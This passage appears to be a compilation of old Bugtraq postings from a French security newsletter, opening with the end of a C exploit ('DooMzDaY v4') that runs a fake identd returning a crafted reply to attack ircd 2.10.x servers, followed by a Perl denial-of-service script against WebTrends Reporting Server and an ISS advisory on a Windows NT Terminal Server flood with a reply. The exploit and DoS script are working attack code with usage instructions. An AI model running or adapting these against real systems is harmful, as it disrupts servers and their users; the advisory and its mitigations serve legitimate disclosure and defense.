+    printf("Broken Pipe\n");
+    return;
+}
+
+int tcpconnect( unsigned long  iP, 
+                unsigned short port, 
+                unsigned short timeout ) {
+
+  int                socky;
+  struct sockaddr_in address;
+  struct sigaction sv;
+  struct hostent *athost;
+  char thathost[0x100];
+  char buffer[512];
+
+  int tries, length;
+  socky = -1;
+  tries = 0;
+
+  sigemptyset(&sv.sa_mask);
+  sv.sa_handler=brokenpipe;
+  sigaction(SIGPIPE,&sv,NULL);    
+
+/*  if ((athost = gethostbyname (thathost)) == NULL) {
+     return -1;     
+  }*/
+
+  fflush(stdout);
+   if ((socky = sockconnect(timeout,iP,port)) == -1) {
+        fprintf(stdout,"Connection refused.\n");
+        socky = -1;
+        return socky;
+   }
+
+  if (socky == -1) printf("Connection refused.\n");    
+  alarm( 0x0 );
+
+  return socky;
+}
+
+
+int ircdboost(char *host, int port, char *nick)
+{
+    int sock;
+    char buf[2048];
+    char *pt;
+    printf("Step 2: Connecting to the IRC Server.\n");
+    sock=tcpconnect(lookup(host),port,10);
+
+    if (sock==-1) {
+        printf("Error: cant connect\n");
+        exit(0x0);
+    }
+    printf("Step 3: Connected.. sending user / join\n");
+    /* the star is very very important */
+    writesock(sock,"USER o a a :a\r\n");
+    snprintf(buf,sizeof(buf),"NICK %s\r\n",nick);
+    writesock(sock,buf);
+    snprintf(buf,sizeof(buf),"WHOIS kbnn%d\r\n",lookup(host));
+    writesock(sock,buf);
+    /* this joins are needed to broadcast the user to the connected servers */
+    writesock(sock,"JOIN #sex\r\n"); /* yeah, right */
+    writesock(sock,"JOIN #showdown\r\n"); /* yeah, right */
+    writesock(sock,"JOIN #funfactory\r\n"); /* yeah, right */
+    writesock(sock,"JOIN #usa\r\n"); /* yeah, right */
+    writesock(sock,"JOIN #flirt.de\r\n"); /* yeah, right */
+    writesock(sock,"JOIN 0\r\n"); /* yeah, right */
+    printf("Step 4: Please press control+break to release the split.\n");
+    while (readsock(sock,buf,sizeof(buf)) >=0)
+    {
+        pt=strstr(buf,"PING");
+        if (pt==buf)
+        {
+            writesock(sock,"PONG :PPP\r\n");
+        }
+        pt=strstr(buf,"ERROR");
+        if (pt==buf) break;
+        printf(buf);
+    }
+    close(sock);
+}
+
+int
+main (int argc, char **argv)
+{
+  int listensocket, insocket, outsocket;
+  short listenport, destport;
+  struct hostent *socks_he, *dest_he;
+  struct sockaddr_in listen_sa, socks_sa;
+  char buf[200];
+  int sopts = 1, maxfd;
+  char c[100];
+  char *po;
+  int length;
+  int cnt;
+  int rc;
+  int lport,fport;
+  fd_set rfds;
+  lport= 0; fport =0;    
+
+  printf("\nDooMzDaY v4 - by psychoid\n");
+  printf("exploits a bug in the ircd ident request of ircd 2.10.x\n");
+
+  if (argc != 4)
+    {
+      printf ("Usage: %s ircserver port nick\n", argv[0]);
+      printf ("Example: %s chat.bt.net 6669 killah\n\n", argv[0]);
+      exit (1);
+    }
+
+  printf("Setting up..\n");
+
+  listenport = 113;
+
+  listensocket = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  setsockopt (listensocket, SOL_SOCKET, SO_REUSEADDR, &sopts, sizeof (int));
+
+  memset (&listen_sa, 0, sizeof (struct sockaddr_in));
+
+  listen_sa.sin_port = htons (listenport);
+  listen_sa.sin_addr.s_addr = htonl (INADDR_ANY);
+
+  socks_sa.sin_port = htons (destport);
+
+  if ((bind (listensocket, (struct sockaddr *) &listen_sa, sizeof (struct sockaddr_in))) == -1)
+    {
+      perror ("bind");
+      exit (1);
+    }
+  if ((listen (listensocket, 1)) == -1)
+    {
+      perror ("listen");
+      exit (1);
+    }
+
+  rc=fork();
+  if (rc ==0) {
+     printf("\nStep 1: Starting identd\n");
+     sleep(2); /* the demon should really run */
+     ircdboost(argv[1],atoi(argv[2]),argv[3]);
+     exit(0x0);    
+  }     
+gee:
+  sleep(1);
+  printf("        Identd started.. listening.\n");
+  insocket = accept (listensocket, NULL, 0);
+  if (insocket == -1)
+    {
+      perror ("accept");
+      exit (1);
+    }
+
+  while (1)
+    {
+      memset(c,0x0,sizeof(c));
+      FD_ZERO (&rfds);
+      FD_SET (insocket, &rfds);
+      select (insocket+1, &rfds, NULL, NULL, NULL);
+      if (FD_ISSET (insocket, &rfds))
+        {
+          length = recv (insocket, c, 100, 0);
+          if (length == -1 || length == 0)
+            break;
+          sscanf(c," %d , %d", &lport, &fport);
+          snprintf(buf,sizeof(buf),"%d , %d : USERID : UNIX : @o ! ! ! ! ! ! \r\n",lport,fport);
+          printf("\nIdent : %s\n",buf);
+          /* sending it a second time because of the lame 1st patch */
+          send(insocket,buf,strlen(buf),0);
+          snprintf(buf,sizeof(buf),": USERID : UNIX : @o ! ! ! ! ! ! \r\n");
+          printf("\nIdent : %s\n",buf);
+          send(insocket,buf,strlen(buf),0);
+          break;
+        }
+    }
+  sleep(1);
+  close (insocket);
+  close (listensocket);
+  wait(0);
+  exit(0x0);
+}
+
+
+
+
+--- Remote DoS of WebTrends Enterprise Reporting Server :
+
+
+
+Hi,
+
+WebTrends Enterprise Reporting Server version 1.5 (Linux/Solaris) is vulnerable
+to a denial of service attack utilizing the Content-length field passed to
+the HTTP daemon. If a negative Content-length is passed to the daemon after a
+POST method has been called, the server will stop responding. WebTrends has been
+notified and a patch is supposedly in the works. Attached is an example script
+to demonstrate the problem.
+
+Version: 1.5 (1.5a has not been tested)
+OS: Linux 2.2.x and Solaris (v?)
+License: Full
+
+Thanks,
+rpc <jared@antisocial.com>
+
+
+#!/usr/bin/perl -w
+# Example DoS against WebTrends Enterprise Reporting Server
+# 8/8/99
+# rpc <jared@antisocial.com>
+
+use IO::Socket;
+
+die "usage: $0 <host> <port>" unless (@ARGV == 2);
+
+($host, $port) = @ARGV;
+
+
+$s = IO::Socket::INET->new(PeerAddr=>$host, PeerPort=>$port, Proto=>'tcp') 
+or die "Can't create socket.";
+
+print $s "POST /\r\n";
+print $s "Content-type: text/plain\r\n";
+print $s "Content-length: -1", "\r\n"x5;
+
+print "done.\n";
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---ISS Security Advisory: Denial of Service Attack Against Windows NT Terminal Server :
+
+-----BEGIN PGP SIGNED MESSAGE-----
+
+
+ISS Security Advisory
+August 9, 1999
+
+Denial of Service Attack Against Windows NT Terminal Server
+
+Synopsis:
+
+The ISS X-Force has discovered a denial of service attack against
+Windows NT Server 4.0, Terminal Server Edition.  This vulnerability
+allows a remote attacker to quickly consume all available memory on a
+Windows NT Terminal Server, causing a significant disruption for users
+currently logged into the terminal server, and preventing any new terminal
+connections from being successfully completed.
+
+Recommended Action:
+Network administrators can protect internal systems from external attack
+by creating a packet filter of the form:
+    - Prevent all incoming packets destined for TCP port 3389
+
+If you have a legitimate need for terminal server connections to be made
+from outside your network, you should limit access to TCP port 3389 to
+only the external IP addresses or networks that have a legitimate reason
+to connect.
+
+The fix for this problem is available at
+ftp://ftp.microsoft.com/bussys/winnt/winnt-public/fixes/usa/NT40tse/hotfixes
+- - -postSP4/Flood-fix/
+
+The Microsoft bulletin describing this issue is available at
+http://www.microsoft.com/security/bulletins/ms99-028.asp.
+
+Description:
+Windows NT Server 4.0 Terminal Server Edition listens for terminal
+connections on TCP port 3389.  Once a TCP connection is made to this port,
+the terminal server will utilize resources in order to handle the new
+client connection and authenticate the connection.  The manner this is
+done, however, requires significant server resources before any
+authentication takes place and without any throttling of resource
+utilization.
+
+Specifically, a remote attacker can quickly cause a server to reach full
+memory utilization by creating a large number of normal TCP connections
+to port 3389.  Individual connections will timeout, but a low bandwidth
+continuous attack will maintain a terminal server at maximum memory
+utilization and prevent new connections from a legitimate source
+from taking place.  Legitimate new connections will fail at this point
+with an error of either a connection timeout, or the terminal server has
+ended the connection.
+
+In testing, a long running attack of this type has been able to
+sporadically crash the terminal server executable and permanently maintain
+the machine at full memory usage without allowing any new terminal server
+connections until the machine was rebooted.
+
+Additional Information:
+
+This vulnerability was primarily researched by David J. Meltzer of the ISS
+X-Force.
+
+________
+
+About ISS:
+
+ISS leads the market as the source for e-business risk management solutions,
+serving as a trusted security provider to thousands of organizations
+including 21 of the 25 largest U.S. commercial banks and more than 35
+government agencies. With its Adaptive Security Management approach, ISS
+empowers organizations to measure and manage enterprise security risks
+within Intranet, extranet and electronic commerce environments. Its
+award-winning SAFEsuite(r) product line of intrusion detection,
+vulnerability management and decision support solutions are vital for
+protection in today's world of global connectivity, enabling organizations
+to proactively monitor, detect and respond to security risks. Founded in
+1994, ISS is headquartered in Atlanta, GA with additional offices
+throughout the U.S. and international operations in Australia/New Zealand,
+Belgium, France, Germany, Japan, Latin America and the UK. For more
+information, visit the ISS Web site at www.iss.net or call 800-776-2362.
+Copyright (c) 1999 by Internet Security Systems, Inc.  Permission is
+hereby granted for the redistribution of this Alert electronically.  It is
+not to be edited in any way without express consent of the X-Force.  If
+you wish to reprint the whole or any part of this Alert in any other
+medium excluding electronic medium, please e-mail xforce@iss.net
+forpermission.
+
+Disclaimer
+
+The information within this paper may change without notice. Use of this
+information constitutes acceptance for use in an AS IS condition. There
+are NO warranties with regard to this information. In no event shall the
+author be liable for any damages whatsoever arising out of or in
+connection with the use or spread of this information. Any use of this
+information is at the user's own risk.
+
+X-Force PGP Key available at: http://xforce.iss.net/sensitive.php3 as
+well as on MIT's PGP key server and PGP.com's key server.
+
+Please send suggestions, updates, and comments to: X-Force xforce@iss.net
+of Internet Security Systems, Inc.
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3a
+Charset: noconv
+
+iQCVAwUBN67ziDRfJiV99eG9AQFDggP+N4t+n/UhAxGiBRJDGxjFeJSgfbjbDMd7
+m6BVFhe4RSDsmLbKoHnK+8J9bM5RoiWMiY6pMe2YUcfQfRySwz3nfmnzpxXjoUmv
+Tv7aWiSvqcc6OVHS7/7tKMzxL49g/6PFPUVqRDhkKrrWbdhTW9uKejn77OfY9l2r
+8ckrqQ4k3l4=
+=4Kwx
+-----END PGP SIGNATURE-----
+
+
+-Réponse :
+
+One small clarification:
+
+At 11:51 AM 8/9/99 -0400, X-Force wrote:
+
+>The ISS X-Force has discovered a denial of service attack against
+>Windows NT Server 4.0, Terminal Server Edition.  This vulnerability
+>allows a remote attacker to quickly consume all available memory on a
+>Windows NT Terminal Server, causing a significant disruption for users
+>currently logged into the terminal server, and preventing any new terminal
+>connections from being successfully completed.
+
+This isn't precisely correct.  The problem is that the attack will consume
+about 1MB of RAM per connection.  If you have a machine with 1GB, and it is
+capped to allow 50 users to connect, a worst-case scenario is that the
+machine will now be running with a mere 950 MB for the users that are
+already on the box.  Under these conditions, the existing users probably
+won't notice the attack.  New users will be hindered in their connection
+(not prevented), as they are competing with the attacker for new slots -
+they might get one before the attack app managed to get the timed out
+connection - at least that's the way it worked when I tested this.  OTOH,
+if you have a 50 user limit on a machine with 64MB of RAM, you'll
+experience a pretty severe disruption, although I don't think I'd want to
+be on that machine with more than a few legitimate users to begin with.  So
+essentially, if you've got the user limit capped at a value where there is
+> 1MB RAM available per user, then "all available memory" won't get
+consumed, and existing users won't experience a significant disruption.  I
+believe Dave Meltzer was doing his testing with a server that had a fairly
+small amount of RAM.
+
+I'd also note that unless someone is spoofing the TCP connections, the IP
+of the attacker is going to show clearly in netstat -a.
+
+That said, I'd upgrade any Terminal Server with the patch, and make sure
+that my firewall rules excluded 3389, unless I wanted to explicitly allow
+people to connect to terminal server from the internet.
+
+
+David LeBlanc
+dleblanc@mindspring.com
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+The blAck Hole,
+
+P.S : pour information, toutes les informations qui se trouvent ici on été tiré de différents news group et 
+mailling list. J'en citerais particulièrement une : bugtraq... Vous pouvez vous y inscrire par web, mais à
+condition d'avoir beaucoup de sans froid et de patience : une semaine = 100 mails minimum, et pas toujours
+intérressant...
+
+_______________________________________________________________________________
